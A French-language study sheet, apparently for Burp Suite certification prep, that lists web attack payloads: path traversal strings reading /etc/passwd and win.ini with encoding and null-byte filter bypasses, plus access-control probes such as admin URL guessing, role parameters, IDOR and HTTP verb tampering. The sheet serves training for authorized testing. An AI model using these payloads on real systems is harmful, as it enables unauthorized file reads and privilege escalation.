---
tags: [bscp, essentiel, payloads]
statut: en cours
---
# Fiche de payloads par vulnérabilité

### Path traversal ([[Path-traversal]])
- Traversal simple (Unix) : `../../../etc/passwd`
- Traversal simple (Windows) : `..\..\..\windows\win.ini`
- Séquences imbriquées (contournement d'un retrait non récursif de `../`) : `....//` ou `....\/`
- Encodage simple : `%2e%2e%2f`
- Double encodage : `%252e%252e%252f`
- Encodage non standard : `%c0%af` ou `..%ef%bc%8f`
- Contournement validation de préfixe (chemin absolu) : `filename=/var/www/images/../../../etc/passwd`
- Contournement validation d'extension (null byte) : `filename=../../../etc/passwd%00.png`
- Liste Burp Intruder dédiée : **Fuzzing - path traversal**

### Access control ([[Access-control]])
- Accès direct à une fonction non liée dans l'UI : deviner/forcer l'URL, ex. `/admin`, `/administrator-panel-<suffixe>`
- Emplacements où chercher une URL sensible divulguée : `/robots.txt`, `sitemap.xml`, code JavaScript de l'interface
- Contournement par paramètre de rôle contrôlable côté client : `?admin=true`, `?role=1`
- Escalade horizontale / IDOR par manipulation d'identifiant : `?id=123` à tester avec d'autres valeurs (`?id=124`, `?id=1`, etc.) sous un compte différent
- Ne pas se limiter au verbe HTTP utilisé par l'UI : rejouer la même requête en GET/POST/PUT/DELETE sur l'endpoint sensible
